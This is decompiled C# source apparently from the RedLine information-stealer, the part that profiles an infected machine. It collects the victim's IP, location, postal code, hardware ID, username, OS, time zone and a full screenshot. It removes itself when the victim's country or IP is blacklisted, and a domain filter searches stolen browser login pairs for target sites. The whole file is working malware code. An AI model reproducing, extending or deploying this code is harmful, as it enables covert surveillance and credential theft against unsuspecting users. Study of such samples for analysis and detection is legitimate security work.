using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using RedLine.Client.Logic.Others;
using RedLine.Client.Models;
using RedLine.Logic.Helpers;
using RedLine.Logic.Others;
using RedLine.Models.Browsers;
using RedLine.Models.WMI;

namespace RedLine.Models
{
	// Token: 0x02000018 RID: 24
	public static class UserLogHelper
	{
		// Token: 0x060000AB RID: 171 RVA: 0x00003698 File Offset: 0x00001898
		public static UserLog Create(ClientSettings settings)
		{
			UserLog result = default(UserLog);
			try
			{
				GeoInfo geoInfo = GeoHelper.Get();
				geoInfo.IP = (string.IsNullOrWhiteSpace(geoInfo.IP) ? "UNKNOWN" : geoInfo.IP);
				geoInfo.Location = (string.IsNullOrWhiteSpace(geoInfo.Location) ? "UNKNOWN" : geoInfo.Location);
				geoInfo.Country = (string.IsNullOrWhiteSpace(geoInfo.Country) ? "UNKNOWN" : geoInfo.Country);
				geoInfo.PostalCode = (string.IsNullOrWhiteSpace(geoInfo.PostalCode) ? "UNKNOWN" : geoInfo.PostalCode);
				IList<string> blacklistedCountry = settings.BlacklistedCountry;
				if (blacklistedCountry != null && blacklistedCountry.Count > 0 && settings.BlacklistedCountry.Contains(geoInfo.Country))
				{
					InstallManager.RemoveCurrent();
				}
				IList<string> blacklistedIP = settings.BlacklistedIP;
				if (blacklistedIP != null && blacklistedIP.Count > 0 && settings.BlacklistedIP.Contains(geoInfo.IP))
				{
					InstallManager.RemoveCurrent();
				}
				WmiDiskDrive wmiDiskDrive = null;
				try
				{
					wmiDiskDrive = new WmiService().QueryFirst<WmiDiskDrive>(new WmiDiskDriveQuery());
				}
				catch (Exception)
				{
				}
				result.HWID = DecryptHelper.GetMd5Hash(Environment.UserDomainName + Environment.UserName + ((wmiDiskDrive != null) ? wmiDiskDrive.SerialNumber : null)).Replace("-", string.Empty);
				string text = TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now).ToString();
				if (!text.StartsWith("-"))
				{
					text = "+" + text;
				}
				result.IP = geoInfo.IP;
				result.Location = geoInfo.Location;
				result.Country = geoInfo.Country;
				result.PostalCode = geoInfo.PostalCode;
				if (settings.GrabScreenshot)
				{
					result.Screenshot = UserLogHelper.CaptureScreen();
				}
				if (settings.GrabUserAgent)
				{
					result.FingerPrint = UserAgentDetector.GetFingerPrint();
				}
				else
				{
					result.FingerPrint = new FingerPrint
					{
						Plugins = "UNKNOWN",
						UserAgent = "UNKNOWN",
						WebBaseGlRenderer = "UNKNOWN",
						WebBaseGlVendor = "UNKNOWN",
						WebBaseGlVersion = "UNKNOWN",
						WebDebugGlRenderer = "UNKNOWN",
						WebDebugGlVendor = "UNKNOWN"
					};
				}
				result.CurrentLanguage = InputLanguage.CurrentInputLanguage.Culture.EnglishName;
				result.TimeZone = "UTC" + text;
				Size size = Screen.PrimaryScreen.Bounds.Size;
				result.MonitorSize = string.Format("{0}x{1}", size.Width, size.Height);
				result.IsProcessElevated = false;
				result.OS = OsDetector.GetWindowsVersion();
				result.Username = Environment.UserName;
			}
			catch (Exception)
			{
			}
			finally
			{
				result.HWID = (string.IsNullOrWhiteSpace(result.HWID) ? "UNKNOWN" : result.HWID);
				result.MonitorSize = (string.IsNullOrWhiteSpace(result.MonitorSize) ? "UNKNOWN" : result.MonitorSize);
				result.OS = (string.IsNullOrWhiteSpace(result.OS) ? "UNKNOWN" : result.OS);
				result.TimeZone = (string.IsNullOrWhiteSpace(result.TimeZone) ? "UNKNOWN" : result.TimeZone);
				result.Username = (string.IsNullOrWhiteSpace(result.Username) ? "UNKNOWN" : result.Username);
				result.IP = (string.IsNullOrWhiteSpace(result.IP) ? "UNKNOWN" : result.IP);
				result.PostalCode = (string.IsNullOrWhiteSpace(result.PostalCode) ? "UNKNOWN" : result.PostalCode);
				result.Location = (string.IsNullOrWhiteSpace(result.Location) ? "UNKNOWN" : result.Location);
				result.Country = (string.IsNullOrWhiteSpace(result.Country) ? "UNKNOWN" : result.Country);
				result.CurrentLanguage = (string.IsNullOrWhiteSpace(result.CurrentLanguage) ? "UNKNOWN" : result.CurrentLanguage);
			}
			return result;
		}

		// Token: 0x060000AC RID: 172 RVA: 0x00003B18 File Offset: 0x00001D18
		public static byte[] CaptureScreen()
		{
			return UserLogHelper.ImageToByte(UserLogHelper.GetScreenshot());
		}

		// Token: 0x060000AD RID: 173 RVA: 0x00003B24 File Offset: 0x00001D24
		private static Bitmap GetScreenshot()
		{
			Bitmap result;
			try
			{
				Size size = Screen.PrimaryScreen.Bounds.Size;
				Bitmap bitmap = new Bitmap(size.Width, size.Height);
				using (Graphics graphics = Graphics.FromImage(bitmap))
				{
					graphics.InterpolationMode = InterpolationMode.Bicubic;
					graphics.PixelOffsetMode = PixelOffsetMode.HighSpeed;
					graphics.SmoothingMode = SmoothingMode.HighSpeed;
					graphics.CopyFromScreen(new Point(0, 0), new Point(0, 0), size);
				}
				result = bitmap;
			}
			catch (Exception)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x060000AE RID: 174 RVA: 0x00003BC0 File Offset: 0x00001DC0
		private static byte[] ImageToByte(Image img)
		{
			byte[] result;
			try
			{
				if (img == null)
				{
					result = null;
				}
				else
				{
					using (MemoryStream memoryStream = new MemoryStream())
					{
						img.Save(memoryStream, ImageFormat.Png);
						result = memoryStream.ToArray();
					}
				}
			}
			catch (Exception)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x060000AF RID: 175 RVA: 0x00003C1C File Offset: 0x00001E1C
		public static bool ContainsDomains(this UserLog log, string domains)
		{
			if (string.IsNullOrWhiteSpace(domains))
			{
				return true;
			}
			string[] array = domains.Split(new string[]
			{
				"|"
			}, StringSplitOptions.RemoveEmptyEntries);
			if (array != null && array.Length == 0)
			{
				return true;
			}
			Credentials credentials = log.Credentials;
			IEnumerable<LoginPair> enumerable;
			if (credentials == null)
			{
				enumerable = null;
			}
			else
			{
				List<Browser> browsers = credentials.Browsers;
				if (browsers == null)
				{
					enumerable = null;
				}
				else
				{
					IEnumerable<Browser> enumerable2 = from x in browsers
					where x.Credentials != null
					select x;
					if (enumerable2 == null)
					{
						enumerable = null;
					}
					else
					{
						enumerable = enumerable2.SelectMany((Browser x) => x.Credentials);
					}
				}
			}
			IEnumerable<LoginPair> enumerable3 = enumerable;
			if (enumerable3 == null)
			{
				return false;
			}
			if (enumerable3.Count<LoginPair>() == 0)
			{
				return false;
			}
			foreach (LoginPair loginPair in enumerable3)
			{
				foreach (string value in array)
				{
					if (loginPair.Host.Contains(value))
					{
						return true;
					}
				}
			}
			return false;
		}
	}
}
